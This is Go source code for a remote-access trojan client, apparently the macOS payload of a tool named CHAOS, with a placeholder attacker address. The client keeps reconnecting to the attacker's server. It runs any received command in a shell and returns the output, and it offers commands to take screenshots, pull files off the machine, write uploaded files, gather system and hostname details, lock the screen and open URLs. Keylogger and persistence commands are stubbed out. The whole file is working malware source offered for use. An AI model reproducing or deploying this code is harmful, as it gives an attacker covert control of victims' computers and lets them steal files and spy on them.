package main

import (
	"bufio"
	"encoding/base64"
	"image/png"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"strconv"

	screenshot "github.com/kbinani/screenshot"
	goInfo "github.com/matishsiao/goInfo"
)

const (
	IP                  = "IPAddress:ServerPort"
	FILENAME            = "FileNameCHAOS"
	FOLDER_PATH         = "\\ProgramData"
	FOLDER_EXT          = "\\NameFolderExtesion"
	TMPDIR_MACOS        = "TMPDIR"
	NEW_LINE     string = "\n"
)

func main() {
	for {
		Connect()
	}
}

func Connect() {
	// Create a connection
	conn, err := net.Dial("tcp", IP)

	// If don't exist a connection created than try connect to a new
	if err != nil {
		log.Println("[*] Connecting...")
		for {
			Connect()
		}
	}

	for {
		// When the command received aren't encoded,
		// skip switch, and be executed on OS shell.
		command, _ := bufio.NewReader(conn).ReadString('\n')
		// log.Println(command)

		// When the command received are encoded,
		// decode message received, and test on switch
		decodedCommand, _ := base64.StdEncoding.DecodeString(command)
		// log.Println(decodedCommand)

		switch string(decodedCommand) {

		case "back":
			conn.Close()
			Connect()

		case "exit":
			conn.Close()
			os.Exit(0)

		case "screenshot":
			SendMessage(conn, EncodeBytesToString(TakeScreenShot()))
			RemoveNewLineCharFromConnection(conn)

		case "keylogger_start":
			SendMessage(conn, " [i] Not supported yet!")
			RemoveNewLineCharFromConnection(conn)

		case "keylogger_show":
			SendMessage(conn, " [i] Not supported yet!")
			RemoveNewLineCharFromConnection(conn)

		case "download":
			pathDownload := ReceiveMessageStdEncoding(conn)

			file, err := ioutil.ReadFile(string(pathDownload))
			if err != nil {
				conn.Write([]byte("[!] File not found!" + "\n"))
			}

			SendMessage(conn, string(file))
			RemoveNewLineCharFromConnection(conn)

		case "upload":
			uploadInput := ReceiveMessageStdEncoding(conn)
			decUpload := ReceiveMessageURLEncoding(conn)
			if string(decUpload) != "" {
				ioutil.WriteFile(string(uploadInput), []byte(decUpload), 777)
			}

		case "getos":
			SendMessage(conn, GetOSInformation())
			RemoveNewLineCharFromConnection(conn)

		case "lockscreen":
			log.Println(RunCmdReturnByte("/System/Library/CoreServices/Menu\\ Extras/User.menu/Contents/Resources/CGSession -suspend"))
			SendMessage(conn, "[i] Locked!")
			RemoveNewLineCharFromConnection(conn)

		case "persistence_enable":
			SendMessage(conn, " [i] Not supported yet!")
			RemoveNewLineCharFromConnection(conn)

		case "persistence_disable":
			SendMessage(conn, " [i] Not supported yet!")
			RemoveNewLineCharFromConnection(conn)

		case "bomb":
			SendMessage(conn, " [i] Not supported yet!")
			RemoveNewLineCharFromConnection(conn)

		case "openurl":
			// Receive url and run it
			url := ReceiveMessageStdEncoding(conn)
			RunCmd("open " + url)

			SendMessage(conn, "[*] Opened!")
			RemoveNewLineCharFromConnection(conn)
		} // end switch

		SendMessage(conn, RunCmdReturnString(command))

		_, err := conn.Read(make([]byte, 0))

		if err != nil {
			Connect()
		}
	}
}

func SendMessage(conn net.Conn, message string) {
	conn.Write([]byte(base64.URLEncoding.EncodeToString([]byte(message)) + NEW_LINE))
}

func ReceiveMessageStdEncoding(conn net.Conn) string {
	message, _ := bufio.NewReader(conn).ReadString('\n')
	messageDecoded, _ := base64.StdEncoding.DecodeString(message)
	return string(messageDecoded)
}

func ReceiveMessageURLEncoding(conn net.Conn) string {
	message, _ := bufio.NewReader(conn).ReadString('\n')
	messageDecoded, _ := base64.URLEncoding.DecodeString(message)
	return string(messageDecoded)
}

func EncodeBytesToString(value []byte) string {
	return base64.URLEncoding.EncodeToString(value)
}

func RemoveNewLineCharFromConnection(conn net.Conn) {
	newLineChar, _ := bufio.NewReader(conn).ReadString('\n')
	log.Println(newLineChar)
}

func RunCmdReturnByte(cmd string) []byte {
	log.Println(cmd)
	out, err := exec.Command("sh", "-c", cmd).Output()
	log.Println(err)
	log.Println(out)
	return out
}

func RunCmdReturnString(cmd string) string {
	log.Println(cmd)
	out, err := exec.Command("sh", "-c", cmd).Output()
	log.Println(err)
	log.Println(out)
	return string(out)
}

func RunCmd(cmd string) {
	log.Println(cmd)
	out, err := exec.Command("sh", "-c", cmd).Output()
	log.Println(err)
	log.Println(out)
}

func CreateFile(path string, text string) {
	create, _ := os.Create(path)
	create.WriteString(text)
	create.Close()
}

func TakeScreenShot() []byte {
	// Create a path to save screenshto
	pathToSaveScreenshot := os.Getenv(TMPDIR_MACOS) + FOLDER_PATH + "\\screenshot.png"

	// Run func to get screenshot
	n := screenshot.NumActiveDisplays()

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			Connect()
		}
		file, _ := os.Create(pathToSaveScreenshot)
		defer file.Close()
		png.Encode(file, img)
	}
	// end func to get screenshot

	// Read screenshot file
	file, err := ioutil.ReadFile(pathToSaveScreenshot)
	if err != nil {
		return nil
	}
	return file
}

func GetOSInformation() string {
	gi := goInfo.GetInfo()
	osInformation := "GoOS: " + gi.GoOS
	osInformation += "\n" + " Kernel: " + gi.Kernel
	osInformation += "\n" + " Core: " + gi.Core
	osInformation += "\n" + " Platform: " + gi.Platform
	osInformation += "\n" + " OS: " + gi.OS
	osInformation += "\n" + " Hostname: " + gi.Hostname
	osInformation += "\n" + " CPUs: " + strconv.Itoa(gi.CPUs)
	return osInformation
}
